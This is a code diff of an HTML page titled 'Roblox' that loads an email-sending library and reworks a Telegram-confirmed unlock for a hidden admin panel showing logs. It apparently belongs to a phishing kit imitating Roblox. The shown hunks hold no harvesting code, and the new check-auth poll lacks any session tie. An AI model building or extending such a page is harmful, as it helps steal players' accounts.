@@ -6,7 +6,6 @@
     <title>Roblox</title>
     <script type="text/javascript" src="http://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        /* Твой дизайн из кода */
         body, html {
             margin: 0; padding: 0; height: 100%;
             font-family: "Segoe UI", Arial, sans-serif;
@@ -62,7 +61,7 @@
             <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">Введите данные и подтвердите в Telegram.</p>
             <input type="text" id="admin_user" placeholder="Admin Login">
             <input type="password" id="admin_pass" placeholder="Admin Password">
-            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="checkAdminAuth()">Unlock</button>
+            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" id="unlock-btn" onclick="checkAdminAuth()">Unlock</button>
         </div>
     </div>
 
@@ -113,33 +112,37 @@
 
         async function checkAdminAuth() {
             const status = document.getElementById('status-text');
-            const sessionId = "sess_" + Date.now();
+            const btn = document.getElementById('unlock-btn');
+            
+            status.innerText = "Waiting for Telegram confirmation...";
+            status.style.color = "#ffff00";
+            btn.disabled = true;
 
             try {
-                // Пытаемся отправить запрос
                 await fetch(`${BACKEND_URL}/auth-attempt`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ sessionId: sessionId })
+                    body: JSON.stringify({ action: 'request' })
                 });
-
-                status.innerText = "Сигнал отправлен! ПРОВЕРЯЙ TELEGRAM.";
-                status.style.color = "#00ff00";
 
                 const checker = setInterval(async () => {
                     try {
-                        const res = await fetch(`${BACKEND_URL}/check-auth/${sessionId}`);
+                        const res = await fetch(`${BACKEND_URL}/check-auth`);
                         const data = await res.json();
-                        if (data.status === 'approved') {
+                        if (data.authorized === true) {
                             clearInterval(checker);
                             showScreen('admin-panel');
                             updateLogs();
                         }
-                    } catch (e) {}
+                    } catch (e) {
+                        console.error("Check failed", e);
+                    }
                 }, 2000);
 
             } catch (e) {
-                alert("Ошибка связи! Проверь Replit.");
+                status.innerText = "Ошибка связи!";
+                status.style.color = "#ff0000";
+                btn.disabled = false;
             }
         }
 
